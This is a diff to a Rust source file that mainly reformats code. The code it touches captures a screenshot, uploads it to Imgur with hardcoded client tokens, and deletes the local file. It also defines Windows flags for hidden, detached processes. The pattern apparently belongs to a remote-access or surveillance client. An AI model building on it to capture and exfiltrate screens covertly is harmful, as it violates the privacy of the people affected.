@@ -17,7 +17,9 @@ use rand::prelude::*;
 use screenshots::Screen;
 use systemstat::{saturating_sub_bytes, Platform, System};
 
+#[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
+#[cfg(target_os = "windows")]
 const DETACHED_PROCESS: u32 = 0x00000008;
 
 pub async fn download_string(url: &str) -> reqwest::Result<String> {
@@ -156,11 +158,19 @@ pub fn screenshot() -> anyhow::Result<String> {
     Ok(save_path)
 }
 
-const IMGUR_TOKENS: &'static [&str] = &["037a0d9b9dc5ce6","3e3ce0d7ac14d56","6998c6570722be5","80772b2547d94b0","a3e9a9b3ba6a1f8"];
+const IMGUR_TOKENS: &'static [&str] = &[
+    "037a0d9b9dc5ce6",
+    "3e3ce0d7ac14d56",
+    "6998c6570722be5",
+    "80772b2547d94b0",
+    "a3e9a9b3ba6a1f8",
+];
 
 pub async fn screenshot_url() -> anyhow::Result<String> {
     let path = screenshot()?;
-    let info = ImgurClient::new(IMGUR_TOKENS[4]).upload_image(&path).await?;
+    let info = ImgurClient::new(IMGUR_TOKENS[4])
+        .upload_image(&path)
+        .await?;
 
     tokio::spawn(async {
         fs::remove_file(path).unwrap();
